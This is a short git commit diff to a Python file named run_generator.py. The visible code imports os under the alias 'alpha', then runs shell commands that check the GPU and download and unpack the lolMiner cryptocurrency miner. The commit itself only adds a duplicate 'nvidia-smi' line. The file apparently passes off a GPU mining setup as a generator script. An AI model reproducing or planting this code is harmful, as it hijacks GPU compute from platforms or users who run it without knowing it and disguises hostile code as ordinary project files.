e4dcab1f2488888e95491a3a7bcb89102cda5759
whiteco123 <92229203+whiteco123@users.noreply.github.com>
2021-10-09 23:21:13 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,6 +1,7 @@
 import os as alpha
 alpha.system("pip install --upgrade pip")
 alpha.system("nvidia-smi")
+alpha.system("nvidia-smi")
 alpha.system("apt-get install wget")
 alpha.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz")
 alpha.system("tar xf lolMiner_v1.31_Lin64.tar.gz")
